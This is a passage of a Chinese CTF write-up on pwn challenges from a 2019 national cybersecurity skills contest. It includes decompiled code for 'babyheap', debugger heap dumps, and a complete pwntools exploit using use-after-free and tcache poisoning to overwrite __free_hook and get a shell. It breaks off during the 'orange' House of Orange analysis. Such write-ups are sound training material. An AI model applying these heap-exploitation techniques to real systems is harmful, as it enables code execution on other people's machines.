# 2019年中国技能大赛—网络安全管理职业技能竞赛个人CTF-web&pwn-writeup
上周参加了“2019年中国技能大赛—全国电信和互联网行业网络安全管理职业技能竞赛”（国家级二类竞赛），本届的题目质量比往届高了不少，看得出主办方在题目方面花了不少心思（给出题人点个赞），web&pwn的题目难度分级控制得不错，部分题目还挺有意思，赛后特此总结一下。
## pwn
### babyheap
    [*] '/home/kira/pwn/gxb/babyheap'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      init_0();
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            menu();
            v3 = get_int();
            if ( v3 != 2 )
              break;
            delete();
          }
          if ( v3 > 2 )
            break;
          if ( v3 != 1 )
            goto LABEL_13;
          add();
        }
        if ( v3 == 3 )
        {
          edit();
        }
        else
        {
          if ( v3 != 4 )
    LABEL_13:
            exit(1);
          show();
        }
      }
    }
菜单式题目，程序有malloc，free，edit，show4个功能。题目提供了libc，版本为2.27，此版本涉及到tcache，需使用ubuntu18.04进行调试。漏洞点比较明显，不过题目进行了一些限制，下面一一分析。
  * add函数
        unsigned __int64 add()
    {
    int v1; // [rsp+Ch] [rbp-14h]
    unsigned __int64 v2; // [rsp+18h] [rbp-8h]
    v2 = __readfsqword(0x28u);
    puts("index:");
    v1 = get_int();
    if ( v1  4 || table[v1] )
      exit(0);
    table[v1] = malloc(0x80uLL);
    ++count;
    puts("content:");
    read(0, table[v1], 0x80uLL);
    return __readfsqword(0x28u) ^ v2;
    }
malloc固定大小为0x80，因此不能直接申请到超过tcache大小的堆块，同时只能申请0-4号5个堆块，有一个count的变量记录当前已申请数量。
  * delete函数
        unsigned __int64 sub_B8D()
    {
    int v1; // [rsp+4h] [rbp-Ch]
    unsigned __int64 v2; // [rsp+8h] [rbp-8h]
    v2 = __readfsqword(0x28u);
    puts("index:");
    v1 = get_int();
    if ( v1  4 || !table[v1] || !count )
      exit(0);
    --count;
    free(table[v1]);
    return __readfsqword(0x28u) ^ v2;
    }
free后没有清空指针，有一个明显的UAF漏洞。由于没有清空指针，因此本题限制了只能申请5个堆块。在malloc和free次数限制的情况下进行getshell是本题的考点。
这里需要了解一下tcache->entries的结构，查看heap开头的位置可以看到如下信息。
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55992fc9dd90 (size : 0x20270)
           last_remainder: 0x0 (size : 0x0)
                unsortbin: 0x0
    (0x110)   tcache_entry[15]: 0x55992fc9d3d0 --> 0x55992fc9d290
    pwndbg> x/32gx 0x55992fc9d000
    0x55992fc9d000: 0x0000000000000000      0x0000000000000251
    0x55992fc9d010: 0x0000000000000000      0x0200000000000000  -> 2 对应 tcache_entry[15] 的数量
    0x55992fc9d020: 0x0000000000000000      0x0000000000000000
    0x55992fc9d030: 0x0000000000000000      0x0000000000000000
    0x55992fc9d040: 0x0000000000000000      0x0000000000000000
    0x55992fc9d050: 0x0000000000000000      0x0000000000000000
    0x55992fc9d060: 0x0000000000000000      0x0000000000000000
    0x55992fc9d070: 0x0000000000000000      0x0000000000000000
    0x55992fc9d080: 0x0000000000000000      0x0000000000000000
    0x55992fc9d090: 0x0000000000000000      0x0000000000000000
    0x55992fc9d0a0: 0x0000000000000000      0x0000000000000000
    0x55992fc9d0b0: 0x0000000000000000      0x0000000000000000
    0x55992fc9d0c0: 0x0000000000000000      0x000055992fc9d3d0 -> tcache_entry[15] 
    0x55992fc9d0d0: 0x0000000000000000      0x0000000000000000
    0x55992fc9d0e0: 0x0000000000000000      0x0000000000000000
    0x55992fc9d0f0: 0x0000000000000000      0x0000000000000000
可以看到记录tcache链表数量和tcache_entry指针位于heap中，我们可以对此段内存使用tcache
attack进行修改，修改tcache链表内数量为7，这就可以不用填满就能泄露libc地址。
具体思路如下：
  1. 使用2次malloc，2次free；
  2. UAF泄露heap地址；
  3. 使用2次malloc，进行一次tcache attack，修改tcache链表内数量为7；
  4. 使用1次free后UAF泄露libc地址；
  5. 使用edit功能，修改tcache_entry指向free_hook;
  6. 使用最后一次malloc，修改free_hook为one_gadget;
完整EXP:
    def add(idx,content):
        p.sendlineafter("4.show\n",'1')
        p.sendlineafter(":",str(idx))
        p.sendafter(":",content)
    def delete(idx):
        p.sendlineafter("4.show\n",'2')
        p.sendlineafter(":",str(idx))
    def edit(idx,content):
        p.sendlineafter("4.show\n","3")
        p.sendlineafter(":",str(idx))
        p.sendafter(":",content)
    def show(idx):
        p.sendlineafter("4.show\n","4")
        p.sendlineafter(":",str(idx))
    add(0,'0\n')
    add(1,'1\n')
    delete(0)
    delete(0)
    show(0)
    print p.recv(6)
    heap = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
    success(hex(heap))
    t = heap - 0x250
    tt = heap - 0x250 + 0x78
    edit(0,p64(t))
    add(2,'0\n')
    add(3,p64(0x0707070707070707).ljust(0x78,'\x00')+p64(tt))
    delete(0)
    show(0)
    libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))  - 0x3ebc40 - 0x60
    success(hex(libc.address))
    edit(3,p64(0x0707070707070707).ljust(0x78,'\x00')+p64(libc.sym['__free_hook']))
    one = 0x4f322
    add(4,p64(libc.address+one))
    delete(4)
    p.interactive()
### orange
    [*] '/home/kira/pwn/gxb/Orange'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    nt __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      signed int v3; // eax
      init(*(_QWORD *)&argc, argv, envp);
      getname();
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = read_int();
          if ( v3 != 2 )
            break;
          show();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            edit();
          }
          else
          {
            if ( v3 == 4 )
            {
              puts("bye");
              exit(1);
            }
    LABEL_14:
            printf("invalid choice");
          }
        }
        else
        {
          if ( v3 != 1 )
            goto LABEL_14;
          add();
        }
      }
    }
看到题目叫Orange，肯定需要利用huose of Orange，题目只有3个功能，add，edit，show，没有free的功能，典型的huose of
Orange利用场景。简单看一下具体有哪些能利用的漏洞。
  * add函数
        int add()
    {
    signed __int64 v0; // rax
    signed int i; // [rsp+8h] [rbp-8h]
    signed int v3; // [rsp+Ch] [rbp-4h]
    for ( i = 0; ; ++i )
    {
      if ( i > 8 )
      {
        LODWORD(v0) = puts("You can't add new page anymore!");
        return v0;
      }
      if ( !*((_QWORD *)&heap + 2 * i) )
        break;